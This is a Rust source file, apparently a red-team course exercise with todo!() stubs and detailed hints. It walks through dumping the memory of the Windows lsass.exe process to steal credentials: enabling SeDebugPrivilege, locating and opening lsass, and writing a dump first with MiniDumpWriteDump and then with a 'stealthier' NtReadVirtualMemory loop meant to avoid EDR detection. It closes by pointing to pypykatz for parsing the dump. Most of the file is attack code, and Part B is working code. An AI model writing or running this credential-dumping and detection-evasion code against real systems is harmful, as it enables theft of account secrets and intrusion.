use std::ffi::c_void;
use std::mem;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
use windows::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, OpenProcessToken,
    SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
    FILE_GENERIC_WRITE, FILE_SHARE_NONE,
};
use windows::Win32::System::Diagnostics::Debug::{
    MiniDumpWithFullMemory, MiniDumpWriteDump,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
    TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEMORY_BASIC_INFORMATION, VirtualQueryEx,
};
use windows::Win32::System::Threading::{
    GetCurrentProcess, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};
use ntapi::ntpsapi::NtReadVirtualMemory;

fn main() {
    unsafe {
        // ---------------------------------------------------------------
        // Step 1 — Enable SeDebugPrivilege.
        // Without this, OpenProcess on lsass.exe will be denied (access error).
        // The technique is identical to Module 20 — enable the privilege on
        // the current process token before attempting to open lsass.
        //
        // Hint: OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htoken)
        //       LookupPrivilegeValueA(PCSTR::null(), b"SeDebugPrivilege\0", &mut luid)
        //       AdjustTokenPrivileges(htoken, FALSE, &tp, 0, None, None)
        let mut htoken = HANDLE::default();
        todo!("OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htoken)");

        let mut luid = windows::Win32::Foundation::LUID::default();
        todo!("LookupPrivilegeValueA(PCSTR::null(), PCSTR(b\"SeDebugPrivilege\\0\".as_ptr()), &mut luid)");

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [windows::Win32::Security::LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        todo!("AdjustTokenPrivileges(htoken, false, &tp, 0, None, None)");
        CloseHandle(htoken).ok();
        println!("SeDebugPrivilege enabled.");

        // ---------------------------------------------------------------
        // Step 2 — Find the lsass.exe PID.
        // Walk the process snapshot until you find "lsass.exe" by name.
        //
        // Hint: CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) -> hsnap
        //       let mut entry = PROCESSENTRY32W { dwSize: mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default() };
        //       Process32FirstW(hsnap, &mut entry)
        //       loop { if entry.szExeFile matches "lsass.exe" → save entry.th32ProcessID; break }
        //       Process32NextW(hsnap, &mut entry)
        //
        // Process names in PROCESSENTRY32W are UTF-16 (u16 arrays).
        // Compare with: entry.szExeFile.iter().take_while(|&&c| c != 0).collect::<Vec<_>>()
        // or use String::from_utf16_lossy(&entry.szExeFile)
        let hsnap = todo!("CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)") as HANDLE;
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        todo!("Process32FirstW(hsnap, &mut entry)");
        let mut lsass_pid: u32 = 0;
        loop {
            todo!("check entry.szExeFile for \"lsass.exe\", save entry.th32ProcessID to lsass_pid if found");
            if Process32NextW(hsnap, &mut entry).is_err() {
                break;
            }
        }
        CloseHandle(hsnap).ok();
        assert!(lsass_pid != 0, "lsass.exe not found in process list");
        println!("lsass.exe PID: {lsass_pid}");

        // ---------------------------------------------------------------
        // Step 3 — Open lsass with the required access rights.
        //
        // Hint: OpenProcess(
        //     dwDesiredAccess: PROCESS_ACCESS_RIGHTS, // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
        //     bInheritHandle: BOOL,                   // false
        //     dwProcessId: u32,                       // lsass_pid
        // ) -> Result<HANDLE>
        let hlsass: HANDLE = todo!("OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, lsass_pid)");
        println!("Opened lsass handle.");

        // ---------------------------------------------------------------
        // Part A — Classic MiniDumpWriteDump (heavily detected)
        // ---------------------------------------------------------------

        // Step 4A — Create the output file.
        //
        // Hint: CreateFileA(
        //     lpFileName: PCSTR,                     // PCSTR(b"lsass.dmp\0".as_ptr())
        //     dwDesiredAccess: FILE_ACCESS_RIGHTS,   // FILE_GENERIC_WRITE
        //     dwShareMode: FILE_SHARE_MODE,          // FILE_SHARE_NONE (0)
        //     lpSecurityAttributes: Option<*const SECURITY_ATTRIBUTES>, // None
        //     dwCreationDisposition: FILE_CREATION_DISPOSITION, // CREATE_ALWAYS
        //     dwFlagsAndAttributes: FILE_FLAGS_AND_ATTRIBUTES,  // FILE_ATTRIBUTE_NORMAL
        //     hTemplateFile: HANDLE,                 // HANDLE::default()
        // ) -> Result<HANDLE>
        let hfile: HANDLE = todo!("CreateFileA(b\"lsass.dmp\", FILE_GENERIC_WRITE, FILE_SHARE_NONE, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, HANDLE::default())");
        assert!(hfile != INVALID_HANDLE_VALUE, "CreateFileA failed");

        // Step 5A — Dump with MiniDumpWriteDump.
        // Note: this call is flagged by every major EDR on write to disk.
        //
        // Hint: MiniDumpWriteDump(
        //     hProcess: HANDLE,                           // hlsass
        //     ProcessId: u32,                             // lsass_pid
        //     hFile: HANDLE,                              // hfile
        //     DumpType: MINIDUMP_TYPE,                    // MiniDumpWithFullMemory
        //     ExceptionParam: Option<*const MINIDUMP_EXCEPTION_INFORMATION>, // None
        //     UserStreamParam: Option<*const MINIDUMP_USER_STREAM_INFORMATION>, // None
        //     CallbackParam: Option<*const MINIDUMP_CALLBACK_INFORMATION>,   // None
        // ) -> Result<()>
        todo!("MiniDumpWriteDump(hlsass, lsass_pid, hfile, MiniDumpWithFullMemory, None, None, None)");
        println!("Part A: lsass.dmp written (would be detected by most EDR).");
        CloseHandle(hfile).ok();

        // ---------------------------------------------------------------
        // Part B — Manual NtReadVirtualMemory loop (stealthier)
        // ---------------------------------------------------------------
        // Instead of the suspicious MiniDumpWriteDump API, enumerate all
        // committed memory regions in lsass using VirtualQueryEx, then read
        // each region's bytes with NtReadVirtualMemory (a lower-level NT API).
        // Write a simple flat dump: for each region, write an 8-byte base address
        // followed by an 8-byte size, followed by the raw bytes.
        // This doesn't produce a valid minidump but captures all committed memory.

        // Step 6B — Create a second output file for the manual dump.
        let hdump: HANDLE = todo!("CreateFileA(b\"lsass_manual.bin\", FILE_GENERIC_WRITE, FILE_SHARE_NONE, None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, HANDLE::default())");
        assert!(hdump != INVALID_HANDLE_VALUE, "CreateFileA for manual dump failed");

        // Step 7B — Enumerate lsass memory regions with VirtualQueryEx.
        //
        // Hint: let mut addr: usize = 0;
        //       loop {
        //           let mut mbi = MEMORY_BASIC_INFORMATION::default();
        //           let ret = VirtualQueryEx(hlsass, Some(addr as *const c_void), &mut mbi, mem::size_of::<MEMORY_BASIC_INFORMATION>());
        //           if ret == 0 { break; }
        //           if mbi.State == MEM_COMMIT { /* read this region */ }
        //           addr += mbi.RegionSize;
        //       }
        let mut addr: usize = 0;
        let mut regions_read: usize = 0;
        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let ret = VirtualQueryEx(
                hlsass,
                Some(addr as *const c_void),
                &mut mbi,
                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if ret == 0 {
                break;
            }

            // Step 8B — For each committed region, read its bytes with NtReadVirtualMemory.
            if mbi.State == MEM_COMMIT {
                // Hint: NtReadVirtualMemory(
                //     ProcessHandle: HANDLE,        // hlsass
                //     BaseAddress: *mut c_void,     // mbi.BaseAddress
                //     Buffer: *mut c_void,          // buf.as_mut_ptr() as *mut c_void
                //     BufferSize: usize,            // mbi.RegionSize
                //     NumberOfBytesRead: *mut usize, // &mut bytes_read
                // ) -> i32 (NTSTATUS)              // 0 = STATUS_SUCCESS
                let mut buf = vec![0u8; mbi.RegionSize];
                let mut bytes_read: usize = 0;
                let status = NtReadVirtualMemory(
                    hlsass.0 as _,
                    mbi.BaseAddress,
                    buf.as_mut_ptr() as *mut c_void,
                    mbi.RegionSize,
                    &mut bytes_read,
                );

                if status == 0 && bytes_read > 0 {
                    // Step 9B — Write the region header + bytes to the manual dump file.
                    // Header: base address (8 bytes) + size (8 bytes)
                    let base = mbi.BaseAddress as u64;
                    let size = bytes_read as u64;
                    let mut written = 0u32;
                    todo!("WriteFile(hdump, base.to_le_bytes().as_ptr() as *const c_void, 8, &mut written, None)");
                    todo!("WriteFile(hdump, size.to_le_bytes().as_ptr() as *const c_void, 8, &mut written, None)");
                    todo!("WriteFile(hdump, buf.as_ptr() as *const c_void, bytes_read as u32, &mut written, None)");
                    regions_read += 1;
                }
            }

            addr += mbi.RegionSize;
        }

        CloseHandle(hdump).ok();
        CloseHandle(hlsass).ok();
        println!("Part B: manual dump complete — {regions_read} regions written to lsass_manual.bin.");
        println!("Parse with custom tooling or adapt pypykatz to the flat format.");
    }
}
